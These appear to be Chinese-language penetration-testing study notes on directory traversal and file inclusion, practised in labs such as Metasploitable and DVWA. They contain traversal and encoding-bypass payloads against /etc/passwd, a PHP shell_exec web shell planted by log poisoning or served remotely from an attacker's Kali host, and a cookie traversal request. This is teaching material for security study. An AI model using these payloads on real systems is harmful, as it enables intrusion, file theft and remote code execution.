1. 手动漏洞挖掘–目录遍历/文件包含

  • Directory traversal/File include（有区别/没区别）
    • 目录权限限制不严/文件包含
⭐区别:
目录遍历：操作系统内部文件
文件包含：1.LFI包含本地文件include 
         2.RFI远程文件包含include（php的include函数）
▲ Directory Browser和Directory traversal/pass不同
  • 修改Metasploitable的配置文件，使Metasploitable出现远程文件包含漏洞
    • 🔺命令：sudo vi /etc/php5/cgi/php.ini
    • allow_url_include=On
    • 🔺命令：sudo /etc/init.d/apache2 restart
  • 应用程序功能操作文件，限制不严时导致访问WEB目录以外的文件
    • 读、写文件、远程执行代码
  • 特征但不绝对
    • ?page=a.php
    • ?home=b.html
    • ?file=content
  • 经典测试方法
    • ?file=../../../../../../../../etc/passwd
    • ?page=file:///etc/passwd（文件包含的话，可以直接填写绝对路径）
    • ?home=main.cgi
    • ?page=http://www.a.com/1.php（远程文件包含）
    • http://1.1.1.1/../../../../../dir/file.txt
  • 编码绕过字符过滤
    • “.” “%00”–空字符（绕过文件扩展名过滤）
    • ?file=a.doc%00.php
    • 使用多种编码尝试
  • 不同操作系统的路径特征字符
    • 类Unix系统（根目录:/ 目录层级分隔符:/）
    • Windows系统（C:/ \或/）
  • URL编码、双层URL编码
    • %2e%2e%2f 解码：../
    • %2e%2e%5c 解码：..\
    • %252e%252e%255c 解码：..\（双层编码，%25解码后为%）
  • Unicode/UTF-8编码
    • ..%c0%af 解码：../
    • ..%u2216
    • ..%c1%9c 解码：..\
  • 其他系统路径可能使用到的字符
    • file.txt…
    • file.txt
    • file.txt````````
    • file.txt<<<>>>
    • ./././file.txt
    • nonexistant/../file.txt（不存在的目录）
  • UNC路径（文件共享路径）
    • \1.1.1.1\path\to\file.txt
  • 本地文件抱哈LFI（一般很难代码执行）
    • 查看文件
    • 代码执行
⭐LFI的代码执行
1.Kali开启nc侦听80端口（目标主机），发送<?php echo shell_exec($_GET['cmd']);?>
2.可查看/var/log/apache2/access.log中有记录（服务器apache2日志文件）
3.查看access.log文件www-data用户是否可以进行执行修改
4.chmod a+rx access.log（若www-data无权限，假设可修改文件属性）
5.chmod a+xr apache2（若www-data无权限，假设可修改文件属性）
6.ls -ld查看权限，保证上级上上级可被www-data执行
7.?page=/var/log/apache2/access.log（LFI本地文件包含）
  • 远程文件执行RFI
    • 出现概率少于LFI，但更容易被利用
    • 测试 
⭐测试远程文件包含
1.kali本地侦听80端口（本机端口）
2.Web page页?page=http://Kali 地址/a.php（不存在的php页面）
3.若kali收到请求，则表示测试成功
⭐远程文件包含
1.Kali机子上vi 1.txt
2.<?php echo shell_exec($_GET['cmd']);?>
3.Kali机子上service apache2 start（存放在/var/www/html/）
4.DVWA访问?page=http://kali ip地址/1.txt&cmd=pwd
  • DVWA的File Inclusion（low）
  • 多种绕过方法
<?php
    $file = $_GET['page'];
?>
  • DVWA的File Inclusion（mediaum）
  • 绕过方法:hthttp://tp://dvwa/….
<?php
    $file = $_GET['page'];

    $file = str_replace("http://","",$file);
    $file = str_replace("https://","",$file);
  • DVWA的File Inclusion（high）
  • 暂无绕过方法
<?php
    $file = $_GET['page'];

    if($file!="include.php")
    {
        echo "ERROR:File not found!";
        exit;
    }
?>
  • /usr/share/wfuzz/wordlist/vulns/（Kali集成攻击向量字典）

2. 手动漏洞挖掘–Cookie存在漏洞

  • 代码
<?php
$template = 'blue.php'
if( is_set($_COOKIE['TEMPLATE']))
    $template = $_COOKIE['TEMPLATE']
include ("/home/users/phpguru/template/".$template)
?>
  • 攻击
GET /vulnerable.php HTTP/1.0
Cookie:TEMPLATE=../../../../../../../../etc/passwd
